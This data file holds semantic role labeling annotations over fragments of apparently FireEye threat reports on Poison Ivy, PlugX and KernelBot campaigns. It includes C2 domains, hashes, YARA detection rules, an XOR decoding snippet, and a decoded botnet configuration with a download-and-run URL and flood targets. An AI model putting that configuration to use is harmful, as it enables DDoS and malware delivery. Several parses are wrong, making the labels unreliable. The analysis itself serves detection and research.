"with"}, "ARGM-CAU": {"text": "CreateFileA"}}}, " This jar file exploited CVE-2012-0507 and\ndropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52)": {"exploited": {"ARG1": {"text": "This jar file"}, "V": {"text": "exploited", "index": 3}, "ARG2": {"text": "CVE-2012 - 0507"}}, "dropped": {"ARG0": {"text": "This jar file"}, "V": {"text": "dropped", "index": 8}, "ARG1": {"text": "a Poison Ivy payload"}, "ARG4": {"text": "with the hash ( MD5 52aa791a524b61b129344f10b4712f52 )"}}}, "\n\nThis actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a\nvariety of malware families on compromised systems": {"has": {"ARG0": {"text": "This actor"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "has", "index": 3}, "ARG1": {"text": "early access to a number of zero - day exploits , including Flash and Java"}}, "including": {"ARG2": {"text": "a number of zero - day exploits"}, "V": {"text": "including", "index": 15}, "ARG1": {"text": "Flash and Java"}}, "deploys": {"ARG0": {"text": "This actor"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "deploys", "index": 21}, "ARG1": {"text": "a variety of malware families on compromised systems"}}, "compromised": {"V": {"text": "compromised", "index": 28}, "ARG1": {"text": "systems"}}}, "\nIn this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be": {"were": {"V": {"text": "were", "index": 5}}, "redirected": {"ARGM-DIS": {"text": "In this case"}, "ARG1": {"text": "visitors"}, "V": {"text": "redirected", "index": 6}, "ARG2": {"text": "from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be"}}, "hosted": {"ARG1": {"text": "a Java exploit"}, "V": {"text": "hosted", "index": 13}, "ARGM-LOC": {"text": "on shop.fujifilm[.]be"}}}, "\n\nThe group behind this campaign appears to have sufficient resources (such as access to zero-day exploits)\nand a determination to infect visitors to foreign and public policy websites": {"appears": {"V": {"text": "appears", "index": 5}, "ARG1": {"text": "to have sufficient resources ( such as access to zero - day exploits ) and a determination to infect visitors to foreign and public policy websites"}}, "have": {"ARG0": {"text": "The group behind this campaign"}, "V": {"text": "have", "index": 7}, "ARG1": {"text": "sufficient resources ( such as access to zero - day exploits ) and a determination to infect visitors to foreign and public policy websites"}}, "infect": {"V": {"text": "infect", "index": 24}, "ARG1": {"text": "visitors"}, "ARG2": {"text": "to foreign and public policy websites"}}}, "\n<table>\nDomain              First Seen       Last Seen       IP Address\nwmi.ns01.us         2012-07-07       2012-09-19      76.73.80.188\nwindows.ddns.us     2012-05-23       2012-06-10      76.73.80.188\n</table>\n\fDuring another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java\nexploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e)": {"were": {"V": {"text": "were", "index": 11}}, "redirected": {"ARGM-TMP": {"text": "During another earlier compromise of the same www.cdi.org website"}, "ARG1": {"text": "visitors"}, "V": {"text": "redirected", "index": 12}, "ARG2": {"text": "to a Java exploit test.jar ( MD5 7d810e3564c4eb95bcb3d11ce191208e"}}}, "\n\nFor Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C\nruntime) gadgets with hard-coded base addresses for English (\u201cen\u201d) and Chinese (\u201czh-cn\u201d and \u201czh-tw\u201d)": {"build": {"ARGM-ADV": {"text": "For Windows XP"}, "ARG0": {"text": "the attackers"}, "V": {"text": "build", "index": 6}, "ARG1": {"text": "a return - oriented programming ( ROP ) chain of MSVCRT ( Visual C runtime ) gadgets with hard - coded base addresses for English ("}}, "oriented": {"ARG0": {"text": "return"}, "V": {"text": "oriented", "index": 10}, "ARG1": {"text": "programming"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 27}, "ARG1": {"text": "base addresses"}}, "cn": {"ARG1": {"text": "\u201c"}, "ARG0": {"text": "zh"}, "V": {"text": "cn", "index": 43}}}, "\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nThe attack uses only known ASLR bypasses": {"uses": {"ARG0": {"text": "The attack"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "only known"}, "ARG2": {"text": "ASLR bypasses"}}, "known": {"ARG1": {"text": "The attack"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "known", "index": 4}, "ARG2": {"text": "ASLR bypasses"}}}, "\n<table>\nDomain              First Seen       Last Seen         IP Address\nwmi.ns01[.]us       2012-07-03       2012-07-04        194.183.224.75\nids.ns01[.]us       2012-04-23       2012-05-18        194.183.224.75\n</table>\nThe Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via\nan exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be)": {"referenced": {"ARGM-ADJ": {"text": "Poison"}, "ARG1": {"text": "Ivy sample"}, "V": {"text": "referenced", "index": 4}, "ARG4": {"text": "above ( MD5 fd69793bd63c44bbb22f9c4d46873252"}}, "was": {"V": {"text": "was", "index": 10}}, "delivered": {"ARG1": {"text": "The Poison Ivy sample referenced above ( MD5 fd69793bd63c44bbb22f9c4d46873252 )"}, "V": {"text": "delivered", "index": 11}, "ARGM-MNR": {"text": "via an exploit chain that began with a redirect from the Center for European Policy Studies ( www.ceps[.]be )"}}, "began": {"ARG1": {"text": "an exploit chain"}, "R-ARG1": {"text": "that"}, "V": {"text": "began", "index": 17}, "ARG2": {"text": "with a redirect from the Center for European Policy Studies ( www.ceps[.]be )"}}}, " The vulnerability permits an\nattacker to overwrite the vftable pointer of a Flash object to redirect code execution": {"permits": {"ARG0": {"text": "The vulnerability"}, "V": {"text": "permits", "index": 2}, "ARG2": {"text": "an attacker"}, "ARG1": {"text": "to overwrite the vftable pointer of a Flash object to redirect code execution"}}, "overwrite": {"ARG0": {"text": "an attacker"}, "V": {"text": "overwrite", "index": 6}, "ARG1": {"text": "the vftable pointer of a Flash object to redirect code execution"}}, "redirect": {"ARG0": {"text": "a Flash object"}, "V": {"text": "redirect", "index": 15}, "ARG1": {"text": "code execution"}}}, "\n<table>\nMD5                               Family Compile Alternate C2s\n                                           Time\n7995a9a6a889b914e208eb924e459ebc PlugX     2012-06-09 fuckchina.govnb[.]com\nbf60b8d26bc0c94dda2e3471de6ec977 PlugX     2010-03-15 microsafes.no-ip[.]org\nfd69793bd63c44bbb22f9c4d46873252 Poison 2013-03-07 N/A\n                                  Ivy\n88b375e3b5c50a3e6c881bc96c926928 Poison 2012-06-11 N/A\n                                  Ivy\ncd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012-06-11 N/A\n                                  Ivy\n</table>\n<table>\nDomain                 First Seen   Last Seen       IP Address\nfuckchina.govnb[.]com 2013-12-11    2013-12-11      204.200.222.136\nmicrosafes.no-ip[.]org 2014-02-12   2014-02-12      74.126.177.70\nmicrosafes.no-ip[.]org 2013-12-04   2013-12-04      74.126.177.241\n</table>\nThe Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique\nconfiguration properties:\n<table>\nMD5                              Password                   Mutex\nfd69793bd63c44bbb22f9c4d46873252 java7                      NBCD*&^FE\n88b375e3b5c50a3e6c881bc96c926928 admin                      ytf^&^333\ncd07a9e49b1f909e1bd9e39a7a6e56b4 admin                      ytf^&^333\n</table>\nWe found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same \u201cjava7\u201d\npassword, which was dropped by an Adobe Flash exploit (CVE-2012-0779)": {"found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 1}, "ARG1": {"text": "a related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 )"}, "ARGM-ADV": {"text": "with the same \u201c java7 \u201d password , which was dropped by an Adobe Flash exploit ( CVE-2012 - 0779 )"}}, "was": {"V": {"text": "was", "index": 20}}, "dropped": {"ARG1": {"text": "the same \u201c java7 \u201d password"}, "R-ARG1": {"text": "which"}, "V": {"text": "dropped", "index": 21}, "ARG0": {"text": "by an Adobe Flash exploit ( CVE-2012"}}}, " In this previous incident,\nvisitors to the Center for Defense Information website (www.cdi[.]org \u2014 also an organization involved in\ndefense matters \u2014 were redirected to an exploit server at 159.54.62.92": {"involved": {"ARG1": {"text": "an organization"}, "V": {"text": "involved", "index": 19}, "ARG2": {"text": "in defense matters \u2014"}}, "were": {"V": {"text": "were", "index": 24}}, "redirected": {"ARGM-LOC": {"text": "In this previous incident"}, "V": {"text": "redirected", "index": 25}, "ARG2": {"text": "to an exploit server at 159.54.62.92"}}}, " This Poison Ivy\nvariant connected to a CnC server at ids.ns01[.]us": {"connected": {"ARG1": {"text": "This Poison Ivy variant"}, "V": {"text": "connected", "index": 4}, "ARG2": {"text": "to a CnC server"}, "ARGM-LOC": {"text": "at ids.ns01[.]us"}}}, " In addition\nto using the same password \u201cjava7,\u201d this variant was configured with the mutex with the similar pattern of\n\u201cYFds*&^ff\u201d and connected to a CnC server at windows.ddns[.]us": {"using": {"V": {"text": "using", "index": 3}, "ARG1": {"text": "the same password \u201c java7"}}, "was": {"ARGM-ADV": {"text": "In addition to using the same password \u201c java7"}, "ARG1": {"text": "\u201d this variant"}, "V": {"text": "was", "index": 13}, "ARG2": {"text": "configured with the mutex with the similar pattern of \u201c YFds*&^ff \u201d and connected to a CnC server at windows.ddns[.]us"}}, "configured": {"ARGM-ADV": {"text": "In addition to using the same password \u201c java7"}, "ARG1": {"text": "\u201d this variant"}, "V": {"text": "configured", "index": 14}, "ARG2": {"text": "with the mutex"}, "ARGM-MNR": {"text": "with"}, "ARG4": {"text": "the similar pattern of \u201c YFds*&^ff \u201d and connected to a CnC server at windows.ddns[.]us"}}, "connected": {"V": {"text": "connected", "index": 27}, "ARG2": {"text": "to a CnC server"}, "ARGM-LOC": {"text": "at windows.ddns[.]us"}}}, " The threat actors likely sought\nto infect users to these sites for follow-on data theft, including information related to defense and public\npolicy matters": {"sought": {"ARGM-ADV": {"text": "likely/ for follow - on data theft ,/ including information related to defense and public policy matters"}, "V": {"text": "sought", "index": 4}, "ARG1": {"text": "to"}, "ARGM-LOC": {"text": "infect users to these sites"}}, "infect": {"ARG0": {"text": "The threat actors"}, "V": {"text": "infect", "index": 6}, "ARG1": {"text": "users"}, "ARG2": {"text": "to these sites"}, "ARGM-CAU": {"text": "for follow - on data theft , including information related to defense and public policy matters"}}, "follow": {"V": {"text": "follow", "index": 12}}, "including": {"ARG2": {"text": "data theft"}, "V": {"text": "including", "index": 18}, "ARG1": {"text": "information related to defense and public policy matters"}}, "related": {"ARG1": {"text": "information"}, "V": {"text": "related", "index": 20}, "ARG2": {"text": "to defense and public policy matters"}}}, " This exploit, in turn, dropped the Poison Ivy variant": {"dropped": {"ARG0": {"text": "This exploit"}, "ARGM-ADV": {"text": "in turn"}, "V": {"text": "dropped", "index": 6}, "ARG1": {"text": "the Poison Ivy variant"}}}, "\n\nWe subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith\nRichardson Foundation (www.srf[.]org) also redirected visitors the exploit server": {"found": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "subsequently"}, "V": {"text": "found", "index": 2}, "ARG1": {"text": "that the American Research Center in Egypt ( www.arce[.]org ) and the Smith Richardson Foundation ( www.srf[.]org ) also redirected visitors the exploit server"}}, "redirected": {"ARG0": {"text": "the American Research Center in Egypt ( www.arce[.]org ) and the Smith Richardson Foundation ( www.srf[.]org )"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "redirected", "index": 22}, "ARG2": {"text": "visitors"}, "ARG1": {"text": "the exploit server"}}}, "\n</section>\n<section>\n<heading>Mitigation</heading>\n\nTo bypass Windows\u2019 Address Space Layout Randomization (ASLR) protections, this exploit targets\ncomputers with any of the following configurations:\n<list>\n      Windows XP\n      Windows 7 and Java 1.6\n\f      Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010\n</list>\nUsers can mitigate the threat by upgrading from Windows XP and updating Java and Office": {"can": {"V": {"text": "can", "index": 1}}, "mitigate": {"ARG0": {"text": "Users"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "mitigate", "index": 2}, "ARG1": {"text": "the threat"}, "ARG2": {"text": "by upgrading/ from Windows XP and updating Java and Office"}}, "upgrading": {"V": {"text": "upgrading", "index": 6}}, "updating": {"ARG0": {"text": "Users"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "updating", "index": 11}, "ARG1": {"text": "Java and Office"}}}, "\nFinally, it runs the file using the WinExec function": {"runs": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "it"}, "V": {"text": "runs", "index": 3}, "ARG1": {"text": "the file"}, "ARGM-MNR": {"text": "using the WinExec function"}}, "using": {"ARG0": {"text": "it"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "the WinExec function"}}}, " This PlugX variant connected to a Google Code project\nat code.google[.]com/p/udom/, where it decoded a command that configured its C2 server": {"connected": {"ARG1": {"text": "This PlugX variant"}, "V": {"text": "connected", "index": 3}, "ARG2": {"text": "to a Google Code project"}}, "decoded": {"ARGM-LOC": {"text": "where"}, "ARG0": {"text": "it"}, "V": {"text": "decoded", "index": 14}, "ARG1": {"text": "a command that configured its C2 server"}}, "configured": {"ARG0": {"text": "a command"}, "R-ARG0": {"text": "that"}, "V": {"text": "configured", "index": 18}, "ARG1": {"text": "its C2 server"}}}, "\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic": {"pushed": {"ARGM-TMP": {"text": "For approximately 14 hours between October 23rd and 24th"}, "ARG0": {"text": "the attackers"}, "V": {"text": "pushed", "index": 12}, "ARG1": {"text": "a configuration update"}, "ARG2": {"text": "to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic"}}, "instructed": {"ARG0": {"text": "four controls servers"}, "R-ARG0": {"text": "that"}, "V": {"text": "instructed", "index": 21}, "ARG1": {"text": "bots"}, "ARG2": {"text": "under their control to flood 124.217.214.149 with UDP traffic"}}, "flood": {"ARG0": {"text": "bots"}, "V": {"text": "flood", "index": 27}, "ARG1": {"text": "124.217.214.149"}, "ARGM-MNR": {"text": "with UDP traffic"}}}, " The following snippet of python\ncode can be used to decode this command:\n<code>\nb64encoded = request.content.rstrip('@$@').lstrip('@$@')\nb64decoded = b64encoded.decode(\"base64\")\n\n\ncommand = \"\"\n\n\nfor c in b64decoded:\n           x = ord(c)\n           x = x ^ XOR_key\n           command += chr(x)\n</code>\n\fFireEye has observed two different single-byte XOR keys used to encode configuration files issued by the\nDDOS C2 servers in this campaign": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "snippet of python code"}}, "can": {"V": {"text": "can", "index": 6}}, "be": {"V": {"text": "be", "index": 7}}, "used": {"ARG1": {"text": "The following snippet of python code"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "to decode this command"}}, "decode": {"V": {"text": "decode", "index": 10}, "ARG1": {"text": "this command"}}, "has": {"V": {"text": "has", "index": 15}}, "observed": {"ARG0": {"text": "FireEye"}, "V": {"text": "observed", "index": 16}, "ARG1": {"text": "two different single - byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign"}}, "used_2": {"ARG1": {"text": "two different"}, "V": {"text": "used", "index": 24}, "ARG2": {"text": "to encode configuration files issued by the DDOS C2 servers in this campaign"}}, "encode": {"V": {"text": "encode", "index": 26}, "ARG1": {"text": "configuration files issued by the DDOS C2 servers in this campaign"}}, "issued": {"ARG1": {"text": "configuration files"}, "V": {"text": "issued", "index": 29}, "ARG0": {"text": "by the DDOS C2 servers in this campaign"}}}, " This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com\nfor C2": {"is": {"V": {"text": "is", "index": 2}}, "detected": {"ARG1": {"text": "This sample"}, "V": {"text": "detected", "index": 3}, "ARGM-MNR": {"text": "as Backdoor"}, "ARG4": {"text": ". APT.Preshin and connected"}, "ARGM-ADV": {"text": "to luxscena[.]com"}}, "connected": {"ARG1": {"text": "This sample"}, "V": {"text": "connected", "index": 9}, "ARG2": {"text": "to luxscena[.]com for C2"}}}, "\n</section>\n<section>\n<heading>Ongoing DDoS Attacks Target the Pro-Democracy Movement</heading>\n\nFireEye has identified a number of binaries coded to receive instructions from a set of command and\ncontrol (C2) servers instructing participating bots to attack Next Media-owned websites and the\nHKGolden forum": {"has": {"V": {"text": "has", "index": 1}}, "identified": {"ARG0": {"text": "FireEye"}, "V": {"text": "identified", "index": 2}, "ARG1": {"text": "a number of binaries coded to receive instructions from a set of command and control ( C2 ) servers instructing participating bots to attack Next Media - owned websites and the HKGolden forum"}}, "coded": {"ARG1": {"text": "binaries"}, "V": {"text": "coded", "index": 7}}, "receive": {"V": {"text": "receive", "index": 9}, "ARG1": {"text": "instructions"}, "ARG2": {"text": "from a set of command"}}, "instructing": {"V": {"text": "instructing", "index": 22}, "ARG1": {"text": "participating bots to attack Next Media - owned websites and the HKGolden forum"}}, "participating": {"V": {"text": "participating", "index": 23}, "ARG0": {"text": "bots"}}, "attack": {"V": {"text": "attack", "index": 26}, "ARG1": {"text": "Next Media - owned websites and the HKGolden forum"}}, "owned": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "Media"}, "V": {"text": "owned", "index": 30}, "ARG1": {"text": "websites"}}}, "\n\nIn recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against\nwebsites promoting democracy in Hong Kong": {"have": {"V": {"text": "have", "index": 5}}, "launched": {"ARGM-TMP": {"text": "In recent weeks"}, "ARG0": {"text": "attackers"}, "V": {"text": "launched", "index": 6}, "ARG1": {"text": "a series of Distributed Denial of Service attacks ( DDoS ) against websites promoting democracy in Hong Kong"}}, "promoting": {"ARGM-DIS": {"text": "websites"}, "V": {"text": "promoting", "index": 20}, "ARG1": {"text": "democracy"}, "ARGM-LOC": {"text": "in Hong Kong"}}}, " 23, 2014, two of the active controls began instructing participating bots to cease attacks": {"began": {"ARGM-DIS": {"text": "23"}, "ARGM-TMP": {"text": "2014"}, "ARG0": {"text": "two of the active controls"}, "V": {"text": "began", "index": 9}, "ARG1": {"text": "instructing participating bots to cease attacks"}}, "instructing": {"ARG0": {"text": "two of the active controls"}, "V": {"text": "instructing", "index": 10}, "ARG1": {"text": "participating bots"}, "ARGM-PRP": {"text": "to cease attacks"}}, "participating": {"V": {"text": "participating", "index": 11}, "ARG0": {"text": "bots"}}, "cease": {"V": {"text": "cease", "index": 14}, "ARG1": {"text": "attacks"}}}, "\nBoth of these certificates are valid but can be detected and blocked via the following Yara signatures:\n<code>\nrule callTogether_certificate\n{\n    meta:\n      author = \"Fireeye Labs\"\n      version = \"1.0\"\n      reference_hash = \"d08e038d318b94764d199d7a85047637\"\n      description = \u201cdetects binaries signed with the CallTogether certificate\u201d\n\f    strings:\n      $serial = {452156C3B3FB0176365BDB5B7715BC4C}\n      $o = \"CallTogether, Inc.\"\n    condition:\n      $serial and $o\n}\n\n\nrule qti_certificate\n{\n      meta:\n           author = \"Fireeye Labs\"\n           reference_hash = \"cfa3e3471430a0096a4e7ea2e3da6195\"\n           description = \"detects binaries signed with the QTI International Inc\ncertificate\"\n      strings:\n           $cn = \"QTI International Inc\"\n           $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }\n      condition:\n           $cn and $serial\n}\n</code>\nThese ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website": {"are": {"ARG1": {"text": "Both of these certificates"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "valid"}}, "can": {"V": {"text": "can", "index": 7}}, "be": {"ARG1": {"text": "Both of these certificates"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 8}, "ARG2": {"text": "detected"}}, "detected": {"ARG1": {"text": "Both of these certificates"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "detected", "index": 9}, "ARGM-MNR": {"text": "via the following Yara signatures"}}, "blocked": {"ARG1": {"text": "Both of these certificates"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "blocked", "index": 11}, "ARGM-MNR": {"text": "via the following Yara signatures"}}, "following": {"V": {"text": "following", "index": 14}, "ARG1": {"text": "Yara signatures"}}, "signatures": {"ARG0": {"text": "Yara"}, "V": {"text": "signatures", "index": 16}}, "target": {"ARG0": {"text": "These ongoing DDoS attacks and previous APT intrusion activity both"}, "V": {"text": "target", "index": 28}, "ARG1": {"text": "the hkgolden[.]com website"}}}, " These configurations issued commands to attack the following domains and\nIPs:\n<list>\nnxapi.appledaily.com[.]hk\n202.85.162.90\n58.64.139.10\n202.85.162.97\n202.85.162.81\n198.41.222.6\n202.85.162.101\n202.85.162.95\n202.85.162.180\n202.85.162.140\n202.85.162.130\n124.217.214.149\n</list>\nAll of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and\n124.217.214.149": {"issued": {"ARG0": {"text": "These configurations"}, "V": {"text": "issued", "index": 2}, "ARG1": {"text": "commands to attack the following domains and IPs"}}, "attack": {"ARG0": {"text": "These configurations"}, "V": {"text": "attack", "index": 5}, "ARG1": {"text": "the following domains and IPs"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "domains and IPs"}}}, " According to the Wall Street Journal, websites belonging to\nNext Media\u2019s Apple Daily publication have suffered from an ongoing DDoS attack that \u201cbrought down its\nemail system for hours\u201d": {"According": {"V": {"text": "According", "index": 0}}, "belonging": {"ARG0": {"text": "websites"}, "V": {"text": "belonging", "index": 8}, "ARG1": {"text": "to Next Media \u2019s Apple Daily publication"}}, "have": {"V": {"text": "have", "index": 16}}, "suffered": {"ARGM-ADV": {"text": "According to the Wall Street Journal"}, "ARG0": {"text": "websites belonging to Next Media \u2019s Apple Daily publication"}, "V": {"text": "suffered", "index": 17}, "ARG1": {"text": "from an ongoing DDoS attack that \u201c brought down its email system for hours \u201d"}}, "brought": {"ARG0": {"text": "an ongoing DDoS attack"}, "R-ARG0": {"text": "that"}, "V": {"text": "brought", "index": 25}, "ARG1": {"text": "its email system"}, "ARGM-TMP": {"text": "for hours \u201d"}}}, " We also detect\nthis payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com": {"detect": {"ARG0": {"text": "We"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "detect", "index": 2}, "ARG1": {"text": "this payload"}, "ARG2": {"text": "as Backdoor . APT.PISCES"}}, "observed": {"ARG0": {"text": "We"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "observed", "index": 10}, "ARG1": {"text": "it connect to u.java-se[.]com"}}, "connect": {"ARG0": {"text": "it"}, "V": {"text": "connect", "index": 12}, "ARG1": {"text": "to u.java-se[.]com"}}}, " 24, 2014, after attacking their own infrastructure,\nthe attackers issued new instructions to their botnet that ceased all attacks": {"attacking": {"V": {"text": "attacking", "index": 5}, "ARG1": {"text": "their own infrastructure"}, "ARG0": {"text": "the attackers"}}, "issued": {"ARGM-TMP": {"text": "24/ 2014/ after attacking their own infrastructure"}, "ARG0": {"text": "the attackers"}, "V": {"text": "issued", "index": 12}, "ARG1": {"text": "new instructions"}, "ARG2": {"text": "to their botnet"}, "C-ARG1": {"text": "that ceased all attacks"}}, "ceased": {"ARG0": {"text": "new instructions/ their botnet"}, "R-ARG0": {"text": "that"}, "V": {"text": "ceased", "index": 19}, "ARG1": {"text": "all attacks"}}}, " Structurally, all of\nthese samples are similar in that they drop three files:\n<list>\n\u2022          ctfmon.exe-a legitimate, signed copy of the Pidgin IM client\n           (md5 hash = 1685f978149d7ba8e039af9a4d5803c7)\n\u2022          libssp-0.dll\u2013malware DLL which is side-loaded by ctfmon.exe\n           to decode and launch KernelBot": {"are": {"ARGM-DIS": {"text": "Structurally"}, "ARG1": {"text": "all of these samples"}, "V": {"text": "are", "index": 6}, "ARG2": {"text": "similar"}, "ARGM-MNR": {"text": "in that they drop three files"}}, "drop": {"ARG0": {"text": "they"}, "V": {"text": "drop", "index": 11}, "ARG1": {"text": "three files"}}, "signed": {"ARG0": {"text": "\u2022 ctfmon.exe-a"}, "V": {"text": "signed", "index": 19}, "ARG1": {"text": "copy of"}}, "is": {"R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 36}}, "loaded": {"ARG1": {"text": ") \u2022 libssp-0.dll\u2013malware DLL"}, "R-ARG1": {"text": "which"}, "V": {"text": "loaded", "index": 39}, "ARG0": {"text": "by ctfmon.exe"}, "ARGM-PRP": {"text": "to decode and launch KernelBot"}}, "decode": {"V": {"text": "decode", "index": 43}}, "launch": {"ARG0": {"text": "which"}, "V": {"text": "launch", "index": 45}, "ARG1": {"text": "KernelBot"}}}, " The encoded configuration\nfile shown above decodes to:\n<list>\n[KernelSetting]\nIsReportState=0\nIsDownFileRun0=0\nCmdID0=1\nDownFileRunUrl0=http://10.0.1.151/1.exe\n[UpdateServer]\nNewVersion=20140926\nUpdateFileUrl=http://10.0.1.151/1.exe\n[DDOS_HostStatistics]\nCountUrl=\nTimer=2\n[DDOS_ScriptFlood]\nIsScriptFlood=1\nCmdID=123\nScriptFloodDNS=\nScriptFloodUrl=http://nxapi.appledaily.com.hk/\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=0\nThreadLoopTime=5\nThreadCount=10\nTimer=360\nIsTimer=1\n[DDOS_ScriptFlood_A1]\nIsScriptFlood=0\nCmdID=1\nScriptFloodDNS=10.0.1.151\nScriptFloodUrl=10.0.1.151/1.html\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=1\nThreadLoopTime=1\nThreadCount=1\n\fTimer=20\nIsTimer=1\n[DDOS_UdpFlood]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_UdpFlood_A1]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_SynFlood]\nIsSynFlood=0\nCmdID=1\nSynFloodDNS=10.0.1.151\nSynFloodPort=80\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood]\nIsTcpFlood=0\nCmdID=1\nTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood_A1]\nIsTcpFlood=0\nCmdID=1\n\fTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=6\nTimer=20\nIsTimer=1\n</list>\nDuring the course of our research, we\u2019ve observed more than 30 different unique configuration files issued\nby the C2 servers listed above": {"encoded": {"V": {"text": "encoded", "index": 1}, "ARG1": {"text": "configuration"}}, "shown": {"ARG0": {"text": "The encoded configuration file"}, "V": {"text": "shown", "index": 4}, "ARG1": {"text": "above decodes/ to"}}, "\u2019ve": {"V": {"text": "\u2019ve", "index": 17}}, "observed": {"ARGM-TMP": {"text": "During the course of our research"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 18}, "ARG1": {"text": "more than 30 different unique configuration files issued by the C2 servers listed above"}}, "issued": {"ARG1": {"text": "more than 30 different unique configuration files"}, "V": {"text": "issued", "index": 26}, "ARG0": {"text": "by the C2 servers listed above"}}, "listed": {"ARG1": {"text": "the C2 servers"}, "V": {"text": "listed", "index": 31}, "ARG2": {"text": "above"}}}, "\nAs noted above, this site has been targeted with a DDoS attack by a KernelBot network": {"noted": {"V": {"text": "noted", "index": 1}, "ARGM-LOC": {"text": "above"}}, "has": {"V": {"text": "has", "index": 6}}, "been": {"V": {"text": "been", "index": 7}}, "targeted": {"ARGM-ADV": {"text": "As noted above"}, "ARG2": {"text": "this site"}, "V": {"text": "targeted", "index": 8}, "ARG1": {"text": "with a DDoS attack"}, "ARG0": {"text": "by a KernelBot network"}}}, "\n\u2022          readme.txt \u2013 a binary file which contains the XOR-encoded\n           KernelBot DLL as well as C2 destination information (most have\n           md5 hash of b5ac964a74091d54e091e68cecd5b532)\n</list>\nThe KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the\nsample": {"contains": {"ARG0": {"text": "a binary file"}, "R-ARG0": {"text": "which"}, "V": {"text": "contains", "index": 7}, "ARG1": {"text": "the XOR - encoded KernelBot DLL as well as C2 destination information"}}, "encoded": {"ARG0": {"text": "XOR"}, "V": {"text": "encoded", "index": 11}, "ARG1": {"text": "KernelBot DLL"}}, "have": {"ARG0": {"text": "C2 destination information ("}, "ARGM-ADV": {"text": "most/ ) The KernelBot implants receive targeting instructions from C2 servers hard - coded directly into the sample"}, "V": {"text": "have", "index": 22}, "ARG1": {"text": "md5 hash of b5ac964a74091d54e091e68cecd5b532"}}, "receive": {"ARG0": {"text": "The KernelBot implants"}, "V": {"text": "receive", "index": 31}, "ARG1": {"text": "targeting instructions"}, "ARG2": {"text": "from C2 servers/ directly into the sample"}, "ARG3": {"text": "hard - coded"}}, "targeting": {"ARG0": {"text": "The KernelBot implants receive"}, "V": {"text": "targeting", "index": 32}, "ARG1": {"text": "instructions from C2 servers hard - coded"}, "ARGM-DIR": {"text": "directly into the sample"}}, "coded": {"ARGM-MNR": {"text": "hard/ directly"}, "V": {"text": "coded", "index": 39}}}, " For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to\nboth www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com": {"drops": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "c3d6450075d618b1edba17ee723eb3ca"}, "V": {"text": "drops", "index": 4}, "ARG1": {"text": "a KernelBot variant that connects to both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com"}}, "connects": {"ARG0": {"text": "a KernelBot variant"}, "R-ARG0": {"text": "that"}, "V": {"text": "connects", "index": 9}, "ARG1": {"text": "to both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com"}}}, " We detect\nthis payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2": {"detect": {"ARG0": {"text": 